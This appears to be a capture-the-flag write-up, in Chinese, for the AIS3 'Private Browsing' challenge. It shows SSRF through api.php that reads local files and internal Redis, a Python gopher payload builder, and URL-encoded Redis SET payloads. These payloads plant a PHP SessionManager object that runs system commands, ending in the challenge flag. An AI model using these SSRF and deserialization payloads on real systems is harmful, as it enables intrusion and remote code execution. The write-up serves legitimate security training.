@@ -1,0 +1,49 @@
+# Private Browsing
+## 題目
+
+## 解題
+看起來是很經典的 ssrf 雖說前端鎖定 `http[s]` 但後端沒鎖，所以直接用 `/api.php` 做 ssrf。
+
+先 `http://chals1.ais3.org:8763/api.php?action=view&url=file:///proc/net/tcp` 看有那些機器可以打。
+
+可以看到 server 頻繁的對 `192.168.224.2:6379` 做存取
+
+google 查到 tcp 6379 port 是 redis
+
+`http://chals1.ais3.org:8763/api.php?action=view&url=dict://192.168.224.2:6379/info` 證實了是 redis。
+
+但資訊依然不夠，因此抓 source code  `http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/api.php`
+
+有一個 `require_once 'session.php'` 把他抓下來 `http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/session.php`
+
+經過長時間的閱讀後可以發現他會將 cookie `sess_id` 作為 key，現在所用的 `BrowsingSession` class serialize 後儲存到 redis
+格式是長這樣 `O:15:"BrowsingSession":1:{s:7:"history";a:1:{i:0;s:19:"https://google.com/";}}` 這就是他做 history 的方式。
+
+這樣的話就可以用這隻 script 建立 payload (dict 的話冒號會不見)
+``` python
+from urllib.parse import quote
+import sys
+
+tcp_payload = sys.argv[2]
+ip = sys.argv[1]
+url = f"gopher://{ip}:6379/_{quote(tcp_payload)}"
+print(url)
+```
+
+
+但是 `BrowsingSession` 並沒有可以利用這點做 RCE 的地方，因為他只有一個 `history` 的 variable 並作為 array 做存取。
+
+發現 `SessionManager` 的 `encode` 跟 `decode` 是 variable function 執行位置是在 `get()` 跟 `__destruct()`(解構子)
+
+原本是著利用 `get()` 做 RCE 因為外層的 `SessionManager` 再跑 `$session->push` 會用 `__call()` return 的 class 去執行 `push` 
+而 `get()` 的內容是 `val` 有東西就直接 return，redis 內有東西就直接 decode redis 的 value，都沒就建一個，而存在 redis 的東西被使用 `gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3BN%3Bs%3A6%3A%5C%22decode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 改成 `O:14:"SessionManager":3:{s:3:"val";N;s:6:"decode";s:6:"system";s:6:"sessid";s:4:"code";}`
+所以他會跑內部的 `SessionManager` 的 `__call()` 然後 call `get()` 因為 `val` 是 null 所以會找 redis，因 redis 的 value 有用 `dict://192.168.224.2:6379/SET%20code%20%22ls%22` 設 `code` 為 `id` 的 command 且 `decode` 被改成 `system` 所以會 RCE。
+
+然而忽略了一點是 `get()` 內的 redis 是 `$this` 下面的而非 `global` 而 connect 後的 redis 無法用 `unserialize` 製造，所以用 `get()` RCE 會是失敗的。
+
+後來想到如果成是 error 內部的 `SessionManager` 也會做 `__destruct()` 因此用 `gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3Bs%3A2%3A%5C%22ls%5C%22%3Bs%3A6%3A%5C%22encode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 將其設為 `O:14:"SessionManager":3:{s:3:"val";s:2:"ls";s:6:"encode";s:6:"system";s:6:"sessid";s:4:"code";}` 然後將 cookie 切為 `fc57bda95a5184e55555` 然後隨便看一個 url 可以發現成功 RCE。
+
+用 `gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3Bs%3A9%3A%5C%22/readflag%5C%22%3Bs%3A6%3A%5C%22encode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 將其設為 `O:14:"SessionManager":3:{s:3:"val";s:9:"/readflag";s:6:"encode";s:6:"system";s:6:"sessid";s:4:"code";}` 然後將 cookie 切為 `fc57bda95a5184e55555` 便可以看到 flag。
+
+## Flag
+`AIS3{deadly_ssrf_to_rce}`
